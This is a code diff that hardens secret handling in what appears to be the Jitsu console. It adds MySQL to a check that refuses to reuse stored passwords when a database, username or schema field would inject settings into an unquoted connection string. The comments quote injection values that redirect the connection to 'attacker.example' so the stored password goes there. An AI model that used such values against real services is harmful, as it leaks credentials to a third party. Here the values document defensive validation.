@@ -154,7 +154,7 @@ export function unmaskSecretsFromOriginal(object: any, dbEntity: any, comparedWi
   // Only signing keys masked (webhook signatureSecret): they sign requests and are never sent to the target
   const onlySigningKeysMasked = maskedPaths(object).every(path => SIGNING_KEY.test(String(path[path.length - 1])));
   const breakers = connectionStringBreakers(object, comparedWith);
-  if (breakers.length > 0 && !onlySigningKeysMasked && containsMaskedSecrets(object)) {
+  if (breakers.fields.length > 0 && !onlySigningKeysMasked && containsMaskedSecrets(object)) {
     throw new ApiError(connectionStringError(breakers), { status: 400 });
   }
   if (changedTargets.length > 0 && !onlySigningKeysMasked) {
@@ -236,35 +236,54 @@ function findChangedTargets(
   });
 }
 
-// Bulker builds the Postgres (and Redshift) connection string as `host=.. dbname=.. user=.. password=.. search_path=..`
-// without quoting, so a space in one of these values starts a new setting: `database: "events host=attacker.example"`
-// connects to that host with the stored password even though `host` itself is unchanged.
-const CONNECTION_STRING_FIELDS: Record<string, string[]> = {
-  postgres: ["database", "username", "defaultSchema"],
-  redshift: ["database", "username", "defaultSchema"],
+// Bulker builds some connection strings by formatting the fields into one string, so a delimiter in a name field changes
+// what the string means, while the stored password is still filled in:
+// - Postgres and Redshift: `host=.. dbname=.. user=.. password=.. search_path=..`, no quoting. A space starts a new
+//   setting, so `database: "events host=attacker.example"` connects to that host.
+// - MySQL: `user:password@tcp(host:port)/database`, split by the driver at its last '@' and '/'. A database such as
+//   `x@tcp(attacker.example:3306)/events` connects to that address and sends it a password starting with the stored one.
+//   (A username cannot move the connection that way, and `user@server` usernames are legitimate, so only `database`.)
+// Bulker now quotes or avoids the string (JITSU-270), but a console talking to an older Bulker must not rely on that.
+const CONNECTION_STRING_TYPES: Record<string, { fields: string[]; breaker: RegExp; what: string }> = {
+  postgres: {
+    fields: ["database", "username", "defaultSchema"],
+    breaker: /[\s'\\]/,
+    what: "a space, quote or backslash",
+  },
+  redshift: {
+    fields: ["database", "username", "defaultSchema"],
+    breaker: /[\s'\\]/,
+    what: "a space, quote or backslash",
+  },
+  mysql: { fields: ["database"], breaker: /[@/?]/, what: "@, / or ?" },
 };
-const CONNECTION_STRING_BREAKER = /[\s'\\]/;
 
 /**
- * Fields of a Postgres or Redshift destination whose value would split or quote the connection string. Whitespace at
- * either end is ignored: it cannot start a setting (the connection string reader skips it after `=` and ends the value
- * at it), and a stored schema with a leading space exists in production and has always worked.
+ * Fields of a Postgres, Redshift or MySQL destination whose value would split or move the connection string, and what
+ * is wrong with them. Whitespace at either end is ignored: it cannot start a setting (the Postgres reader skips it
+ * after `=` and ends the value at it), and a stored schema with a leading space exists in production and has always
+ * worked.
  */
-export function connectionStringBreakers(...objects: any[]): string[] {
-  const type = objects.map(o => o?.destinationType).find(t => t in CONNECTION_STRING_FIELDS);
+export function connectionStringBreakers(...objects: any[]): { fields: string[]; what: string } {
+  const type = objects
+    .map(o => o?.destinationType)
+    .find(t => typeof t === "string" && Object.prototype.hasOwnProperty.call(CONNECTION_STRING_TYPES, t));
   if (!type) {
-    return [];
+    return { fields: [], what: "" };
   }
+  const { fields, breaker, what } = CONNECTION_STRING_TYPES[type];
   const object = objects[0];
-  return CONNECTION_STRING_FIELDS[type].filter(
-    field => typeof object?.[field] === "string" && CONNECTION_STRING_BREAKER.test(object[field].trim())
-  );
+  return {
+    fields: fields.filter(field => typeof object?.[field] === "string" && breaker.test(object[field].trim())),
+    what,
+  };
 }
 
-const connectionStringError = (fields: string[]) =>
-  `Cannot reuse saved secrets because ${fields.join(
-    ", "
-  )} contains a space, quote or backslash, which would change the connection. Enter the secret values again to continue.`;
+const connectionStringReason = ({ fields, what }: { fields: string[]; what: string }) =>
+  `${fields.join(", ")} contains ${what}, which would change the connection`;
+
+const connectionStringError = (breakers: { fields: string[]; what: string }) =>
+  `Cannot reuse saved secrets because ${connectionStringReason(breakers)}. Enter the secret values again to continue.`;
 
 // Secrets that are used to sign requests and are never sent to the connection target
 const SIGNING_KEY = /signature|signing|hmac/i;
@@ -331,7 +350,7 @@ function targetFieldsBetween(
 export function assertSecretsStayWithTarget(original: any, patch: any, merged: any, secretPaths: string[]): void {
   const changed = changedTargetFieldsBetween(merged, original);
   const breakers = connectionStringBreakers(merged, original);
-  if (changed.length === 0 && breakers.length === 0) {
+  if (changed.length === 0 && breakers.fields.length === 0) {
     return;
   }
   const keptSecrets = secretPaths.filter(path => {
@@ -347,10 +366,7 @@ export function assertSecretsStayWithTarget(original: any, patch: any, merged: a
     return isEmptyValue(supplied) || supplied === MASKED_SECRET;
   });
   if (keptSecrets.length > 0) {
-    const reason =
-      changed.length > 0
-        ? `${changed.join(", ")} changed`
-        : `${breakers.join(", ")} contains a space, quote or backslash, which would change the connection`;
+    const reason = changed.length > 0 ? `${changed.join(", ")} changed` : connectionStringReason(breakers);
     throw new ApiError(
       `Cannot keep the saved secrets (${keptSecrets.join(
         ", "
